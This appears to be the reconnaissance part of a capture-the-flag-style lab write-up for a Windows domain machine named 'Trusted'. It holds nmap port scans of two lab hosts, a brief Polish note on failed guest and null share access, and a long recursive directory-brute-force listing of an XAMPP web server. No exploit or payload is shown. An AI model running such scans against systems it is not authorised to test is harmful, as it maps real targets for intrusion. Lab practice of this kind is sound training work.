# Trusted
Windows, Easy, created by **r0BIT**

![trusted_slide](https://github.com/user-attachments/assets/4eb8268d-451f-4107-bbe6-4e02f563df51)


```
Nmap scan report for 10.10.229.149
PORT     STATE         SERVICE      VERSION
53/udp   open          domain       Simple DNS Plus
88/udp   open          kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-03 11:49:57Z)
123/udp  open          ntp          NTP v3
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf

Nmap scan report for 10.10.229.150
PORT     STATE         SERVICE      VERSION
53/udp   open          domain       (generic dns response: SERVFAIL)
88/udp   open          kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-03 11:50:41Z)
123/udp  open          ntp          Microsoft NTP
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf

```

```
Nmap scan report for 10.10.229.149
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-03 11:51:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
55645/tcp open  msrpc         Microsoft Windows RPC
60498/tcp open  msrpc         Microsoft Windows RPC
65503/tcp open  msrpc         Microsoft Windows RPC

Nmap scan report for 10.10.229.150
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-03 11:51:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL 5.5.5-10.4.24-MariaDB
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
50386/tcp open  msrpc         Microsoft Windows RPC
50477/tcp open  msrpc         Microsoft Windows RPC
65474/tcp open  msrpc         Microsoft Windows RPC
```

-rid i shares na guest i na null nie wchodzi.

dałem rekursywanie i poszedłem sobie na zakupy także.. trochę tego wyszło
```
302      GET        0l        0w        0c http://10.10.229.150/ => http://10.10.229.150/dashboard/
301      GET        9l       30w      336c http://10.10.229.150/DEV => http://10.10.229.150/DEV/
301      GET        9l       30w      342c http://10.10.229.150/Dashboard => http://10.10.229.150/Dashboard/
301      GET        9l       30w      336c http://10.10.229.150/Dev => http://10.10.229.150/Dev/
200      GET       80l      208w     2311c http://10.10.229.150/DEV/index.html
200      GET       31l      195w    17155c http://10.10.229.150/DEV/images/logo.png
200      GET      612l     1583w    11331c http://10.10.229.150/DEV/css/style.css
200      GET      323l      924w    79670c http://10.10.229.150/DEV/images/family-large.jpg
200      GET       80l      208w     2311c http://10.10.229.150/DEV/
200      GET       58l      382w    37111c http://10.10.229.150/DEV/images/prenuptial.jpg
200      GET       16l       93w     6429c http://10.10.229.150/DEV/images/thumbnail-sideview.jpg
200      GET       65l      460w    43646c http://10.10.229.150/DEV/images/bg-adbox.png
200      GET      315l     1842w   149229c http://10.10.229.150/DEV/images/family.png
200      GET       31l      195w    17155c http://10.10.229.150/Dev/images/logo.png
200      GET       80l      208w     2311c http://10.10.229.150/Dev/index.html
200      GET      612l     1583w    11331c http://10.10.229.150/Dev/css/style.css
200      GET      323l      924w    79670c http://10.10.229.150/Dev/images/family-large.jpg
200      GET       80l      208w     2311c http://10.10.229.150/Dev/
200      GET       65l      460w    43646c http://10.10.229.150/Dev/images/bg-adbox.png
200      GET      315l     1842w   149229c http://10.10.229.150/Dev/images/family.png
200      GET       49l      133w     4060c http://10.10.229.150/Dev/images/bg-footnote.jpg
200      GET        6l       56w     3225c http://10.10.229.150/Dev/images/bg-footer.png
200      GET       15l       97w     6647c http://10.10.229.150/Dev/images/thumbnail-focus.jpg
200      GET       14l      105w     7671c http://10.10.229.150/Dev/images/thumbnail-smile.jpg
200      GET       30l      162w    11333c http://10.10.229.150/Dev/images/smile.jpg
200      GET       11l      103w     5860c http://10.10.229.150/Dev/images/thumbnail-happy.jpg
200      GET       27l      156w    11991c http://10.10.229.150/Dev/images/handshake.jpg
200      GET        8l       91w     5615c http://10.10.229.150/Dev/images/thumbnail-frontview.jpg
200      GET       16l       93w     6429c http://10.10.229.150/Dev/images/thumbnail-sideview.jpg
200      GET        6l      108w     4672c http://10.10.229.150/Dev/images/interface.png
200      GET       24l      156w    11896c http://10.10.229.150/Dev/images/family-small.jpg
200      GET       56l      262w    21931c http://10.10.229.150/Dev/images/divorce.jpg
200      GET       72l      397w    29702c http://10.10.229.150/Dev/images/happy.jpg
200      GET       58l      382w    37111c http://10.10.229.150/Dev/images/prenuptial.jpg
200      GET       46l      296w    21946c http://10.10.229.150/Dev/images/bride.jpg
200      GET       34l      342w    17551c http://10.10.229.150/Dev/images/frames.png
200      GET       35l      209w    17125c http://10.10.229.150/Dev/images/meeting.jpg
200      GET      131l      991w    62256c http://10.10.229.150/Dev/images/thumb-up.jpg
200      GET       37l      173w    10393c http://10.10.229.150/Dev/images/bride-sideview.jpg
200      GET        7l       79w     5370c http://10.10.229.150/Dev/images/icons.png
200      GET      109l      603w    50334c http://10.10.229.150/Dev/images/laughing.jpg
200      GET        6l      434w    71670c http://10.10.229.150/Favicon.ico
200      GET       24l      156w    11896c http://10.10.229.150/DEV/images/family-small.jpg
200      GET       34l      342w    17551c http://10.10.229.150/DEV/images/frames.png
200      GET       14l      105w     7671c http://10.10.229.150/DEV/images/thumbnail-smile.jpg
200      GET       72l      397w    29702c http://10.10.229.150/DEV/images/happy.jpg
200      GET       49l      133w     4060c http://10.10.229.150/DEV/images/bg-footnote.jpg
200      GET        8l       91w     5615c http://10.10.229.150/DEV/images/thumbnail-frontview.jpg
200      GET       35l      209w    17125c http://10.10.229.150/DEV/images/meeting.jpg
200      GET        5l       44w     1353c http://10.10.229.150/DEV/images/bg-header.jpg
200      GET       56l      262w    21931c http://10.10.229.150/DEV/images/divorce.jpg
200      GET        6l      108w     4672c http://10.10.229.150/DEV/images/interface.png
200      GET        0l        0w    12653c http://10.10.229.150/DEV/images/bride.jpg
200      GET      167l      649w     7576c http://10.10.229.150/Dashboard/
301      GET        9l       30w      336c http://10.10.229.150/IMG => http://10.10.229.150/IMG/
200      GET        3l       16w     1549c http://10.10.229.150/IMG/module_table_bottom.png
301      GET        9l       30w      336c http://10.10.229.150/Img => http://10.10.229.150/Img/
302      GET        0l        0w        0c http://10.10.229.150/Index.php => http://10.10.229.150/dashboard/
200      GET        5l        9w      694c http://10.10.229.150/Img/module_table_top.png
200      GET        3l       16w     1549c http://10.10.229.150/Img/module_table_bottom.png
200      GET        5l        9w      694c http://10.10.229.150/IMG/module_table_top.png
301      GET        9l       30w      342c http://10.10.229.150/WEBALIZER => http://10.10.229.150/WEBALIZER/
301      GET        9l       30w      342c http://10.10.229.150/Webalizer => http://10.10.229.150/Webalizer/
200      GET       79l      250w     3607c http://10.10.229.150/applications.html
200      GET       17l       21w      177c http://10.10.229.150/bitnami.css
200      GET      167l      649w     7576c http://10.10.229.150/dashboard/index.html
200      GET      131l      390w     6021c http://10.10.229.150/dashboard/howto.html
200      GET        7l       57w     2442c http://10.10.229.150/dashboard/images/fastly-logo.png
200      GET        8l       76w     4088c http://10.10.229.150/dashboard/images/fastly-logo@2x.png
200      GET      523l     3762w    31751c http://10.10.229.150/dashboard/faq.html
200      GET      870l     4681w    77162c http://10.10.229.150/dashboard/phpinfo.php
200      GET      376l      890w     6876c http://10.10.229.150/dashboard/stylesheets/normalize.css
200      GET     9147l    36448w   481698c http://10.10.229.150/dashboard/stylesheets/all.css
200      GET      723l     5244w    39391c http://10.10.229.150/dashboard/stylesheets/asciidoctor.css
200      GET     9147l    36448w   481810c http://10.10.229.150/dashboard/stylesheets/all-rtl.css
200      GET       59l      401w    30451c http://10.10.229.150/dashboard/images/stack-icons.png
200      GET        6l       66w     2819c http://10.10.229.150/dashboard/images/windows-logo.png
200      GET       50l       99w     5427c http://10.10.229.150/dashboard/images/xampp-logo.svg
200      GET       40l      202w    14635c http://10.10.229.150/dashboard/images/xampp-newsletter-logo.png
200      GET        9l       35w     3787c http://10.10.229.150/dashboard/images/addons/elegantthemes-icon.png
200      GET        6l       28w     3664c http://10.10.229.150/dashboard/images/addons/wpmu-icon.png
200      GET        6l       51w     5053c http://10.10.229.150/dashboard/images/addons/woothemes-icon.png
200      GET       12l       67w     4697c http://10.10.229.150/dashboard/images/addons/rockettheme-icon.png
200      GET       11l       51w     6226c http://10.10.229.150/dashboard/images/addons/templatemonster-icon.png
200      GET      167l      649w     7576c http://10.10.229.150/dashboard/
200      GET       12l       53w     4718c http://10.10.229.150/dashboard/images/addons/themeforest-icon.png
200      GET      121l      297w     4384c http://10.10.229.150/Dashboard/404.html
301      GET        9l       30w      342c http://10.10.229.150/dashboard => http://10.10.229.150/dashboard/
301      GET        9l       30w      336c http://10.10.229.150/dev => http://10.10.229.150/dev/
200      GET       41l       94w     1177c http://10.10.229.150/Dev/About.html
200      GET        6l      434w    71670c http://10.10.229.150/favicon.ICO
200      GET        6l      434w    71670c http://10.10.229.150/favicon.ico
200      GET      131l      991w    62256c http://10.10.229.150/DEV/images/thumb-up.jpg
200      GET       41l       94w     1177c http://10.10.229.150/DEV/About.html
301      GET        9l       30w      345c http://10.10.229.150/Dashboard/DE => http://10.10.229.150/Dashboard/DE/
301      GET        9l       30w      347c http://10.10.229.150/Dashboard/DOCS => http://10.10.229.150/Dashboard/DOCS/
200      GET      148l      407w     5279c http://10.10.229.150/Dashboard/DOCS/increase-php-file-upload-limit.html
200      GET        9l       25w      212c http://10.10.229.150/Dashboard/DOCS/increase-php-file-upload-limit.pdfmarks
200      GET      262l      910w     9905c http://10.10.229.150/Dashboard/DOCS/create-framework-project-zf2.html
200      GET        9l       22w      201c http://10.10.229.150/Dashboard/DOCS/configure-vhosts.pdfmarks
200      GET        9l       25w      220c http://10.10.229.150/Dashboard/DOCS/change-mysql-temp-dir.pdfmarks
200      GET      577l     1455w     9437c http://10.10.229.150/Dashboard/DOCS/increase-php-file-upload-limit.pdf
200      GET      254l     1031w    10670c http://10.10.229.150/Dashboard/DOCS/configure-wildcard-subdomains.html
200      GET      266l     1118w    10947c http://10.10.229.150/Dashboard/DOCS/send-mail.html
200      GET        9l       23w      201c http://10.10.229.150/Dashboard/DOCS/activate-use-xdebug.pdfmarks
200      GET      246l      953w     9814c http://10.10.229.150/Dashboard/DOCS/configure-use-tomcat.html
200      GET        9l       24w      212c http://10.10.229.150/Dashboard/DOCS/install-wordpress.pdfmarks
200      GET        9l       22w      213c http://10.10.229.150/Dashboard/DOCS/configure-wildcard-subdomains.pdfmarks
200      GET        9l       23w      196c http://10.10.229.150/Dashboard/DOCS/send-mail.pdfmarks
200      GET      239l      962w     9394c http://10.10.229.150/Dashboard/DOCS/use-sqlite.html
200      GET        9l       24w      205c http://10.10.229.150/Dashboard/DOCS/use-different-php-version.pdfmarks
200      GET      189l      563w     6720c http://10.10.229.150/Dashboard/DOCS/reset-mysql-password.html
200      GET        9l       24w      212c http://10.10.229.150/Dashboard/DOCS/access-phpmyadmin-remotely.pdfmarks
200      GET        9l       23w      196c http://10.10.229.150/Dashboard/DOCS/use-sqlite.pdfmarks
200      GET        9l       22w      198c http://10.10.229.150/Dashboard/DOCS/transfer-files-ftp.pdfmarks
200      GET        9l       24w      209c http://10.10.229.150/Dashboard/DOCS/deploy-git-app.pdfmarks
200      GET      145l      409w     5198c http://10.10.229.150/Dashboard/DOCS/auto-start-xampp.html
200      GET        9l       24w      220c http://10.10.229.150/Dashboard/DOCS/backup-restore-mysql.pdfmarks
200      GET        9l       21w      194c http://10.10.229.150/Dashboard/DOCS/auto-start-xampp.pdfmarks
200      GET        9l       23w      199c http://10.10.229.150/Dashboard/DOCS/use-php-fcgi.pdfmarks
200      GET      192l      653w     7209c http://10.10.229.150/Dashboard/DOCS/use-different-php-version.html
200      GET      251l     1031w    10416c http://10.10.229.150/Dashboard/DOCS/configure-vhosts.html
200      GET     1007l     3248w    96850c http://10.10.229.150/Dashboard/DOCS/reset-mysql-password.pdf
200      GET      716l     2108w    53180c http://10.10.229.150/Dashboard/DOCS/access-phpmyadmin-remotely.pdf
200      GET     1913l     5341w    94836c http://10.10.229.150/Dashboard/DOCS/create-framework-project-zf1.pdf
200      GET     2220l     6600w   143895c http://10.10.229.150/Dashboard/DOCS/configure-wildcard-subdomains.pdf
200      GET      212l      595w     7092c http://10.10.229.150/Dashboard/DOCS/use-php-fcgi.html
200      GET      265l      887w     9166c http://10.10.229.150/Dashboard/DOCS/transfer-files-ftp.html
200      GET     1118l     3102w    65875c http://10.10.229.150/Dashboard/DOCS/use-different-php-version.pdf
200      GET      142l      396w     5160c http://10.10.229.150/Dashboard/DOCS/change-mysql-temp-dir.html
200      GET      240l      797w     8859c http://10.10.229.150/Dashboard/DOCS/create-framework-project-zf1.html
200      GET      164l      451w     5813c http://10.10.229.150/Dashboard/DOCS/access-phpmyadmin-remotely.html
200      GET      491l     1265w     8252c http://10.10.229.150/Dashboard/DOCS/change-mysql-temp-dir.pdf
200      GET      201l      871w     8893c http://10.10.229.150/Dashboard/DOCS/deploy-git-app.html
200      GET      457l     1940w    18262c http://10.10.229.150/Dashboard/DOCS/install-wordpress.html
200      GET      411l     1476w    14779c http://10.10.229.150/Dashboard/DOCS/troubleshoot-apache.html
200      GET        9l       24w      215c http://10.10.229.150/Dashboard/DOCS/reset-mysql-password.pdfmarks
200      GET        9l       23w      214c http://10.10.229.150/Dashboard/DOCS/troubleshoot-apache.pdfmarks
200      GET        9l       24w      209c http://10.10.229.150/Dashboard/DOCS/configure-use-tomcat.pdfmarks
200      GET        9l       26w      214c http://10.10.229.150/Dashboard/DOCS/create-framework-project-zf1.pdfmarks
200      GET        9l       26w      214c http://10.10.229.150/Dashboard/DOCS/create-framework-project-zf2.pdfmarks
200      GET      354l     1472w    14297c http://10.10.229.150/Dashboard/DOCS/backup-restore-mysql.html
200      GET     2202l     6080w   102037c http://10.10.229.150/Dashboard/DOCS/send-mail.pdf
200      GET      209l      804w     8476c http://10.10.229.150/Dashboard/DOCS/activate-use-xdebug.html
301      GET        9l       30w      345c http://10.10.229.150/Dashboard/De => http://10.10.229.150/Dashboard/De/
200      GET     5474l    20420w  1123045c http://10.10.229.150/Dashboard/DOCS/install-wordpress.pdf
200      GET     1985l     7213w   358821c http://10.10.229.150/Dashboard/DOCS/configure-use-tomcat.pdf
200      GET     1694l     5251w   203968c http://10.10.229.150/Dashboard/DOCS/deploy-git-app.pdf
200      GET     2497l     7555w   223960c http://10.10.229.150/Dashboard/DOCS/create-framework-project-zf2.pdf
200      GET     1241l     3311w    46923c http://10.10.229.150/Dashboard/DOCS/use-php-fcgi.pdf
200      GET      455l     1433w    50421c http://10.10.229.150/Dashboard/DOCS/auto-start-xampp.pdf
200      GET     1993l     5633w   186879c http://10.10.229.150/Dashboard/DOCS/activate-use-xdebug.pdf
200      GET     1733l     4717w    63573c http://10.10.229.150/Dashboard/DOCS/use-sqlite.pdf
200      GET     2007l     7708w   329917c http://10.10.229.150/Dashboard/DOCS/transfer-files-ftp.pdf
200      GET     2063l     6324w   157912c http://10.10.229.150/Dashboard/DOCS/configure-vhosts.pdf
301      GET        9l       30w      340c http://10.10.229.150/Dev/Css => http://10.10.229.150/Dev/Css/
200      GET     4360l    16918w   859084c http://10.10.229.150/Dashboard/DOCS/troubleshoot-apache.pdf
200      GET       33l      263w     4851c http://10.10.229.150/Dashboard/DOCS/images/
200      GET        1l        2w       22c http://10.10.229.150/Dev/DB.php
200      GET     3708l    12696w   520057c http://10.10.229.150/Dashboard/DOCS/backup-restore-mysql.pdf
301      GET        9l       30w      347c http://10.10.229.150/Dashboard/Docs => http://10.10.229.150/Dashboard/Docs/
200      GET        9l       23w      199c http://10.10.229.150/Dashboard/Docs/use-php-fcgi.pdfmarks
200      GET      265l      887w     9166c http://10.10.229.150/Dashboard/Docs/transfer-files-ftp.html
200      GET      148l      407w     5279c http://10.10.229.150/Dashboard/Docs/increase-php-file-upload-limit.html
200      GET        9l       23w      214c http://10.10.229.150/Dashboard/Docs/troubleshoot-apache.pdfmarks
200      GET        9l       24w      220c http://10.10.229.150/Dashboard/Docs/backup-restore-mysql.pdfmarks
200      GET        9l       21w      194c http://10.10.229.150/Dashboard/Docs/auto-start-xampp.pdfmarks
200      GET        9l       26w      214c http://10.10.229.150/Dashboard/Docs/create-framework-project-zf2.pdfmarks
200      GET        9l       24w      209c http://10.10.229.150/Dashboard/Docs/deploy-git-app.pdfmarks
200      GET      262l      910w     9905c http://10.10.229.150/Dashboard/Docs/create-framework-project-zf2.html
200      GET        9l       24w      212c http://10.10.229.150/Dashboard/Docs/access-phpmyadmin-remotely.pdfmarks
200      GET        9l       24w      212c http://10.10.229.150/Dashboard/Docs/install-wordpress.pdfmarks
200      GET        9l       25w      220c http://10.10.229.150/Dashboard/Docs/change-mysql-temp-dir.pdfmarks
200      GET      189l      563w     6720c http://10.10.229.150/Dashboard/Docs/reset-mysql-password.html
200      GET      251l     1031w    10416c http://10.10.229.150/Dashboard/Docs/configure-vhosts.html
200      GET      266l     1118w    10947c http://10.10.229.150/Dashboard/Docs/send-mail.html
200      GET        9l       23w      196c http://10.10.229.150/Dashboard/Docs/send-mail.pdfmarks
200      GET        9l       23w      201c http://10.10.229.150/Dashboard/Docs/activate-use-xdebug.pdfmarks
200      GET      142l      396w     5160c http://10.10.229.150/Dashboard/Docs/change-mysql-temp-dir.html
200      GET      201l      871w     8893c http://10.10.229.150/Dashboard/Docs/deploy-git-app.html
200      GET     1241l     3311w    46923c http://10.10.229.150/Dashboard/Docs/use-php-fcgi.pdf
200      GET      491l     1265w     8252c http://10.10.229.150/Dashboard/Docs/change-mysql-temp-dir.pdf
200      GET      254l     1031w    10670c http://10.10.229.150/Dashboard/Docs/configure-wildcard-subdomains.html
200      GET      455l     1433w    50421c http://10.10.229.150/Dashboard/Docs/auto-start-xampp.pdf
200      GET      411l     1476w    14779c http://10.10.229.150/Dashboard/Docs/troubleshoot-apache.html
200      GET        9l       22w      201c http://10.10.229.150/Dashboard/Docs/configure-vhosts.pdfmarks
200      GET     2202l     6080w   102037c http://10.10.229.150/Dashboard/Docs/send-mail.pdf
200      GET     1733l     4717w    63573c http://10.10.229.150/Dashboard/Docs/use-sqlite.pdf
200      GET     1913l     5341w    94836c http://10.10.229.150/Dashboard/Docs/create-framework-project-zf1.pdf
200      GET      240l      797w     8859c http://10.10.229.150/Dashboard/Docs/create-framework-project-zf1.html
200      GET     1007l     3248w    96850c http://10.10.229.150/Dashboard/Docs/reset-mysql-password.pdf
200      GET        9l       24w      209c http://10.10.229.150/Dashboard/Docs/configure-use-tomcat.pdfmarks
200      GET     2007l     7708w   329917c http://10.10.229.150/Dashboard/Docs/transfer-files-ftp.pdf
200      GET        9l       26w      214c http://10.10.229.150/Dashboard/Docs/create-framework-project-zf1.pdfmarks
200      GET        9l       22w      213c http://10.10.229.150/Dashboard/Docs/configure-wildcard-subdomains.pdfmarks
200      GET        9l       23w      196c http://10.10.229.150/Dashboard/Docs/use-sqlite.pdfmarks
200      GET      164l      451w     5813c http://10.10.229.150/Dashboard/Docs/access-phpmyadmin-remotely.html
200      GET     2497l     7555w   223960c http://10.10.229.150/Dashboard/Docs/create-framework-project-zf2.pdf
200      GET      209l      804w     8476c http://10.10.229.150/Dashboard/Docs/activate-use-xdebug.html
200      GET      239l      962w     9394c http://10.10.229.150/Dashboard/Docs/use-sqlite.html
200      GET      212l      595w     7092c http://10.10.229.150/Dashboard/Docs/use-php-fcgi.html
200      GET      145l      409w     5198c http://10.10.229.150/Dashboard/Docs/auto-start-xampp.html
200      GET      457l     1940w    18262c http://10.10.229.150/Dashboard/Docs/install-wordpress.html
200      GET     1985l     7213w   358821c http://10.10.229.150/Dashboard/Docs/configure-use-tomcat.pdf
200      GET      192l      653w     7209c http://10.10.229.150/Dashboard/Docs/use-different-php-version.html
200      GET     1993l     5633w   186879c http://10.10.229.150/Dashboard/Docs/activate-use-xdebug.pdf
200      GET     2220l     6600w   143895c http://10.10.229.150/Dashboard/Docs/configure-wildcard-subdomains.pdf
200      GET     5474l    20420w  1123045c http://10.10.229.150/Dashboard/Docs/install-wordpress.pdf
200      GET      716l     2108w    53180c http://10.10.229.150/Dashboard/Docs/access-phpmyadmin-remotely.pdf
200      GET     3708l    12696w   520057c http://10.10.229.150/Dashboard/Docs/backup-restore-mysql.pdf
200      GET     1694l     5251w   203968c http://10.10.229.150/Dashboard/Docs/deploy-git-app.pdf
301      GET        9l       30w      354c http://10.10.229.150/Dashboard/Docs/images => http://10.10.229.150/Dashboard/Docs/images/
200      GET     2063l     6324w   157912c http://10.10.229.150/Dashboard/Docs/configure-vhosts.pdf
200      GET     4360l    16918w   859084c http://10.10.229.150/Dashboard/Docs/troubleshoot-apache.pdf
404      GET        0l        0w      299c http://10.10.229.150/DEV/C005
200      GET       75l      156w     1967c http://10.10.229.150/DEV/Contact.html
301      GET        9l       30w      345c http://10.10.229.150/Dashboard/JP => http://10.10.229.150/Dashboard/JP/
200      GET      167l      586w     7953c http://10.10.229.150/Dashboard/JP/
301      GET        9l       30w      343c http://10.10.229.150/DEV/Images => http://10.10.229.150/DEV/Images/
200      GET       43l      342w     6846c http://10.10.229.150/DEV/Images/
301      GET        9l       30w      345c http://10.10.229.150/Dashboard/PL => http://10.10.229.150/Dashboard/PL/
302      GET        0l        0w        0c http://10.10.229.150/index.Php => http://10.10.229.150/dashboard/
301      GET        9l       30w      354c http://10.10.229.150/Dashboard/StyleSheets => http://10.10.229.150/Dashboard/StyleSheets/
200      GET      376l      890w     6876c http://10.10.229.150/Dashboard/StyleSheets/normalize.css
200      GET      723l     5244w    39391c http://10.10.229.150/Dashboard/StyleSheets/asciidoctor.css
200      GET        0l        0w   481810c http://10.10.229.150/Dashboard/StyleSheets/all-rtl.css
200      GET        0l        0w   481698c http://10.10.229.150/Dashboard/StyleSheets/all.css
200      GET       41l       94w     1177c http://10.10.229.150/Dev/about.html
301      GET        9l       30w      345c http://10.10.229.150/dashboard/DE => http://10.10.229.150/dashboard/DE/
301      GET        9l       30w      345c http://10.10.229.150/dashboard/De => http://10.10.229.150/dashboard/De/
301      GET        9l       30w      345c http://10.10.229.150/dashboard/ES => http://10.10.229.150/dashboard/ES/
200      GET      523l     3762w    31751c http://10.10.229.150/dashboard/Faq.html
200      GET        1l        4w     2534c http://10.10.229.150/dashboard/Favicon.ico
301      GET        9l       30w      345c http://10.10.229.150/dashboard/JP => http://10.10.229.150/dashboard/JP/
301      GET        9l       30w      345c http://10.10.229.150/dashboard/It => http://10.10.229.150/dashboard/It/
301      GET        9l       30w      354c http://10.10.229.150/dashboard/Javascripts => http://10.10.229.150/dashboard/Javascripts/
301      GET        9l       30w      345c http://10.10.229.150/dashboard/RO => http://10.10.229.150/dashboard/RO/
301      GET        9l       30w      345c http://10.10.229.150/dashboard/RU => http://10.10.229.150/dashboard/RU/
200      GET      167l      638w     8028c http://10.10.229.150/dashboard/RU/
301      GET        9l       30w      340c http://10.10.229.150/dev/CSS => http://10.10.229.150/dev/CSS/
200      GET       75l      156w     1967c http://10.10.229.150/Dev/contact.html
301      GET        9l       30w      340c http://10.10.229.150/dev/Css => http://10.10.229.150/dev/Css/
200      GET        1l        2w       22c http://10.10.229.150/dev/DB.php
301      GET        9l       30w      343c http://10.10.229.150/dev/IMAGES => http://10.10.229.150/dev/IMAGES/
200      GET       14l      105w     7671c http://10.10.229.150/dev/IMAGES/thumbnail-smile.jpg
200      GET       16l       93w     6429c http://10.10.229.150/dev/IMAGES/thumbnail-sideview.jpg
200      GET       65l      460w    43646c http://10.10.229.150/dev/IMAGES/bg-adbox.png
200      GET        5l       44w     1353c http://10.10.229.150/dev/IMAGES/bg-header.jpg
200      GET       49l      133w     4060c http://10.10.229.150/dev/IMAGES/bg-footnote.jpg
200      GET       30l      162w    11333c http://10.10.229.150/dev/IMAGES/smile.jpg
200      GET       37l      173w    10393c http://10.10.229.150/dev/IMAGES/bride-sideview.jpg
200      GET        6l      108w     4672c http://10.10.229.150/dev/IMAGES/interface.png
200      GET       35l      209w    17125c http://10.10.229.150/dev/IMAGES/meeting.jpg
200      GET       34l      342w    17551c http://10.10.229.150/dev/IMAGES/frames.png
200      GET      109l      603w    50334c http://10.10.229.150/dev/IMAGES/laughing.jpg
200      GET       31l      195w    17155c http://10.10.229.150/dev/IMAGES/logo.png
200      GET      323l      924w    79670c http://10.10.229.150/dev/IMAGES/family-large.jpg
200      GET       15l       97w     6647c http://10.10.229.150/dev/IMAGES/thumbnail-focus.jpg
200      GET        1l        2w       22c http://10.10.229.150/DEV/db.php
200      GET        1l        4w     2534c http://10.10.229.150/Dashboard/favicon.ico
200      GET      167l      663w     7797c http://10.10.229.150/Dashboard/DE/index.html
200      GET      523l     3766w    35718c http://10.10.229.150/Dashboard/DE/FAQ.html
200      GET      523l     3766w    35718c http://10.10.229.150/Dashboard/DE/Faq.html
301      GET        9l       30w      345c http://10.10.229.150/Dashboard/fr => http://10.10.229.150/Dashboard/fr/
200      GET      523l     3766w    35718c http://10.10.229.150/Dashboard/De/FAQ.html
200      GET      523l     3766w    35718c http://10.10.229.150/Dashboard/De/Faq.html
200      GET      167l      663w     7797c http://10.10.229.150/Dashboard/De/Index.html
200      GET      167l      586w     7953c http://10.10.229.150/Dashboard/JP/index.html
200      GET      523l     3279w    33898c http://10.10.229.150/Dashboard/JP/Faq.html
404      GET        0l        0w      299c http://10.10.229.150/Dashboard/Docs/images/Limbo
200      GET      167l      586w     7953c http://10.10.229.150/Dashboard/JP/Index.html
301      GET        9l       30w      345c http://10.10.229.150/Dashboard/hu => http://10.10.229.150/Dashboard/hu/
301      GET        9l       30w      343c http://10.10.229.150/DEV/images => http://10.10.229.150/DEV/images/
404      GET        0l        0w      299c http://10.10.229.150/Dashboard/fr/21312
200      GET      523l     3892w    34144c http://10.10.229.150/dashboard/It/Faq.html
301      GET        9l       30w      349c http://10.10.229.150/dashboard/images => http://10.10.229.150/dashboard/images/
301      GET        9l       30w      354c http://10.10.229.150/dashboard/javascripts => http://10.10.229.150/dashboard/javascripts/
200      GET      870l     4681w    77162c http://10.10.229.150/Dashboard/phpInfo.php
200      GET      523l     3766w    35718c http://10.10.229.150/Dashboard/De/faq.html
200      GET      523l     3279w    33898c http://10.10.229.150/Dashboard/JP/faq.html
200      GET      870l     4681w    77162c http://10.10.229.150/dashboard/phpInfo.php
301      GET        9l       30w      345c http://10.10.229.150/dashboard/ru => http://10.10.229.150/dashboard/ru/
200      GET      131l      390w     6084c http://10.10.229.150/dashboard/RU/howto.html
200      GET      523l     3788w    33717c http://10.10.229.150/Dashboard/fr/faq.html
301      GET        9l       30w      364c http://10.10.229.150/Dashboard/Docs/images/send-mail => http://10.10.229.150/Dashboard/Docs/images/send-mail/
200      GET      612l     1583w    11331c http://10.10.229.150/dev/CSS/style.css
200      GET      167l      638w     8028c http://10.10.229.150/dashboard/ru/index.html
200      GET      523l     3565w    45372c http://10.10.229.150/dashboard/ru/faq.html
